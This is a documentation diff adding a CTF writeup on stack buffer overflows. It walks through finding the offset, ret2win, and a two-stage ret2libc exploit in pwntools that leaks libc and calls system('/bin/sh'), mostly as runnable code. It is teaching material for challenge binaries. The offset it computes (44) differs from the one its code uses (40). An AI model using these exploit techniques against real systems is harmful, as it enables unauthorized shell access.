@@ -1,0 +1,316 @@
+---
+title: "Buffer Overflow CTF Writeup: Stack Smashing to Shell"
+sidebarTitle: "Buffer Overflow"
+description: "Stack buffer overflow CTF walkthrough: find the offset, control EIP/RIP, redirect execution, and use pwntools to build and deliver the exploit payload."
+---
+
+A stack buffer overflow is the oldest trick in binary exploitation, and it remains one of the most common vulnerability classes in beginner-to-intermediate CTF pwn challenges. The idea is simple: a fixed-size buffer lives on the stack, and the program writes more data into it than it can hold. The excess bytes spill into adjacent stack memory — overwriting the saved frame pointer, then the saved return address — and when the function returns, the CPU jumps to wherever you told it to go. Your job is to control that destination with surgical precision.
+
+## Challenge Setup
+
+This writeup follows a 32-bit Linux ELF binary compiled with a vulnerable `gets()` call. The same concepts apply to 64-bit binaries and `strcpy()`; differences are called out explicitly where they matter.
+
+Start with your recon commands:
+
+```bash
+file challenge
+checksec --file=challenge
+strings challenge | grep -i flag
+```
+
+Sample output for a deliberately vulnerable challenge binary:
+
+```
+challenge: ELF 32-bit LSB executable, Intel 80386, dynamically linked
+RELRO           STACK CANARY      NX            PIE
+Partial RELRO   No canary found   NX disabled   No PIE
+```
+
+No canary, no PIE, NX disabled. This is a classic beginner stack smash — you can inject shellcode or jump directly to a `win()` function that the binary already contains.
+
+<Tip>
+`NX disabled` means the stack is executable, so shellcode injection is possible. `No canary found` means you can overwrite the return address without needing to leak anything first. `No PIE` means every address in the binary is fixed and predictable across runs.
+</Tip>
+
+## Finding the Vulnerability
+
+Open the binary in GDB or a decompiler. The vulnerable code typically looks like one of these patterns:
+
+```c
+void vuln() {
+    char buf[32];
+    gets(buf);          // no length check — classic
+}
+
+void vuln2() {
+    char buf[32];
+    strcpy(buf, argv[1]);   // copies until null byte, no bounds check
+}
+
+void vuln3() {
+    char buf[32];
+    read(0, buf, 256);      // reads 256 bytes into a 32-byte buffer
+}
+```
+
+In GDB, disassemble the vulnerable function to confirm the buffer size and find the exact layout:
+
+```bash
+gdb -q ./challenge
+(gdb) disas vuln
+```
+
+Look for the `sub esp, 0xNN` instruction at the function prologue — that tells you how much stack space is reserved for locals. The buffer starts somewhere in that space, and the saved return address sits just above it (at a higher address on x86, meaning it's reached by writing past the end of the buffer).
+
+## Determining the Offset
+
+You need to know exactly how many bytes of padding to send before your controlled return address begins. The fastest way is a **cyclic pattern** — a non-repeating sequence where every 4-byte (or 8-byte) chunk is unique, so you can look up the crash address and immediately know the offset.
+
+<Steps>
+  <Step title="Generate and send the pattern">
+    In pwntools, `cyclic(200)` generates 200 bytes of De Bruijn sequence. Send it as input and let the program crash.
+
+    ```python
+    from pwn import *
+
+    p = process('./challenge')
+    p.sendline(cyclic(200))
+    p.wait()
+    ```
+
+    Or do it interactively in GDB:
+
+    ```bash
+    (gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
+    Program received signal SIGSEGV.
+    (gdb) info registers eip
+    eip  0x61616166
+    ```
+  </Step>
+
+  <Step title="Calculate the offset from the crash address">
+    Feed the crashed EIP value back into `cyclic_find()`:
+
+    ```python
+    from pwn import *
+    print(cyclic_find(0x61616166))   # returns the byte offset — e.g., 44
+    ```
+
+    For 64-bit binaries, use `cyclic_find(crashed_rip, n=8)`. If GDB shows only a partial overwrite (e.g., `0x00007f6161616166`), strip the upper bytes first.
+  </Step>
+
+  <Step title="Verify the offset">
+    Confirm by sending exactly `offset` A-bytes followed by four B-bytes and checking that EIP lands on `0x42424242`:
+
+    ```python
+    from pwn import *
+
+    p = process('./challenge')
+    p.sendline(b'A' * 44 + b'BBBB')
+    p.wait()
+    # In GDB: eip should be 0x42424242
+    ```
+  </Step>
+</Steps>
+
+## Technique 1 — Ret2Win (Jump to a Hidden Function)
+
+Many CTF challenges include a `win()` function — never called by normal program flow — that either prints the flag directly or spawns a shell. All you need to do is overwrite the return address with `win`'s address.
+
+<Steps>
+  <Step title="Find the win function address">
+    ```python
+    from pwn import *
+
+    binary = ELF('./challenge')
+    print(hex(binary.symbols['win']))   # e.g., 0x080491a6
+    ```
+
+    Or in GDB:
+
+    ```bash
+    (gdb) info functions win
+    0x080491a6  win
+    ```
+  </Step>
+
+  <Step title="Build and send the payload">
+    ```python
+    from pwn import *
+
+    binary = ELF('./challenge')
+    p = process('./challenge')
+
+    # Find offset with cyclic
+    # cyclic(200) -> send, look at crash EIP with cyclic_find()
+    offset = 40
+    win_addr = binary.symbols['win']
+
+    payload = b'A' * offset
+    payload += p32(win_addr)  # or p64 for 64-bit
+
+    p.sendline(payload)
+    p.interactive()
+    ```
+
+    `p32()` packs the address as a 4-byte little-endian integer, matching x86 memory layout. Use `p64()` for 64-bit binaries.
+  </Step>
+
+  <Step title="Run against remote">
+    Swap `process('./challenge')` for `remote('challenge.ctf.site', 1337)` and send the same payload. Remote offsets and addresses are identical as long as the binary matches.
+
+    ```python
+    p = remote('challenge.ctf.site', 1337)
+    ```
+  </Step>
+</Steps>
+
+## Technique 2 — Ret2Libc (64-bit, NX Enabled)
+
+When there's no `win()` function and NX is enabled (you can't run shellcode), you pivot to **ret2libc**: call `system("/bin/sh")` using the libc that the binary already loads. On 64-bit, this requires a two-stage exploit — first leak a libc address to defeat ASLR, then make the actual `system()` call.
+
+<Note>
+On 64-bit x86-64, function arguments are passed in registers (`rdi`, `rsi`, `rdx`, …), not on the stack. To call `system("/bin/sh")`, you must control `rdi`. You do this with a `pop rdi; ret` gadget — see the ROP Chains writeup for full detail. The pwntools `ROP` class handles this automatically.
+</Note>
+
+<Steps>
+  <Step title="Stage 1 — Leak a libc address via puts">
+    Call `puts(puts@got)` to print the runtime address of `puts` in libc, then return to `main` so you get a second input opportunity.
+
+    ```python
+    from pwn import *
+
+    binary = ELF('./challenge')
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    p = process('./challenge')
+
+    rop = ROP(binary)
+    rop.puts(binary.got['puts'])
+    rop.call(binary.symbols['main'])
+
+    payload = b'A' * 72 + rop.chain()
+    p.sendline(payload)
+    # Parse leaked puts address to find libc base
+    ```
+
+    After sending, read the leaked address:
+
+    ```python
+    p.recvuntil(b'\n')          # consume any banner output
+    leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
+    libc_base = leaked - libc.symbols['puts']
+    log.success(f'libc base: {hex(libc_base)}')
+    ```
+  </Step>
+
+  <Step title="Stage 2 — Call system('/bin/sh')">
+    With `libc_base` known, compute the runtime addresses of `system` and the `/bin/sh` string, then send the second payload:
+
+    ```python
+    system = libc_base + libc.symbols['system']
+    binsh  = libc_base + next(libc.search(b'/bin/sh'))
+    ret    = ROP(binary).find_gadget(['ret'])[0]  # stack alignment
+
+    rop2 = ROP(binary)
+    rop2.raw(ret)                        # 16-byte alignment for x86-64 ABI
+    rop2.call(system, [binsh])
+
+    payload2 = b'A' * 72 + rop2.chain()
+    p.sendline(payload2)
+    p.interactive()
+    ```
+  </Step>
+</Steps>
+
+## GDB Workflow Reference
+
+These are the GDB commands you reach for most often during a buffer overflow investigation:
+
+```bash
+# Load and run
+gdb -q ./challenge
+(gdb) run
+
+# Disassemble a function
+(gdb) disas vuln
+(gdb) disas main
+
+# Inspect registers after crash
+(gdb) info registers
+(gdb) info registers eip    # 32-bit
+(gdb) info registers rip    # 64-bit
+
+# Examine memory around the stack pointer
+(gdb) x/40wx $esp           # 32-bit: 40 words at esp
+(gdb) x/40gx $rsp           # 64-bit: 40 giant-words at rsp
+
+# Set a breakpoint and step
+(gdb) break *0x080491a6
+(gdb) continue
+(gdb) nexti
+
+# Find a string in memory
+(gdb) find $esp, +200, "AAAA"
+
+# pwndbg: show stack layout visually
+(gdb) stack 20
+```
+
+<Warning>
+Always test your exploit locally against a copy of the binary before pointing it at the remote server. Offsets computed from a different binary version, a different libc, or a different compiler will be wrong. If the challenge provides a `Dockerfile` or `libc.so.6`, use those exact files.
+</Warning>
+
+## Complete Exploit Reference
+
+<Tabs>
+  <Tab title="Ret2Win (32-bit)">
+    ```python
+    from pwn import *
+
+    binary = ELF('./challenge')
+    p = process('./challenge')
+
+    offset   = 40                        # bytes to reach saved EIP
+    win_addr = binary.symbols['win']     # address of win()
+
+    payload  = b'A' * offset
+    payload += p32(win_addr)
+
+    p.sendline(payload)
+    p.interactive()
+    ```
+  </Tab>
+  <Tab title="Ret2Libc (64-bit)">
+    ```python
+    from pwn import *
+
+    binary = ELF('./challenge')
+    libc   = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    p      = process('./challenge')
+
+    # ── Stage 1: leak puts runtime address ──────────────────
+    rop1 = ROP(binary)
+    rop1.puts(binary.got['puts'])
+    rop1.call(binary.symbols['main'])
+
+    p.sendline(b'A' * 72 + rop1.chain())
+
+    p.recvuntil(b'\n')
+    leaked     = u64(p.recvline().strip().ljust(8, b'\x00'))
+    libc_base  = leaked - libc.symbols['puts']
+    log.success(f'libc base @ {hex(libc_base)}')
+
+    # ── Stage 2: system('/bin/sh') ───────────────────────────
+    system = libc_base + libc.symbols['system']
+    binsh  = libc_base + next(libc.search(b'/bin/sh'))
+    ret    = ROP(binary).find_gadget(['ret'])[0]
+
+    rop2 = ROP(binary)
+    rop2.raw(ret)
+    rop2.call(system, [binsh])
+
+    p.sendline(b'A' * 72 + rop2.chain())
+    p.interactive()
+    ```
+  </Tab>
+</Tabs>
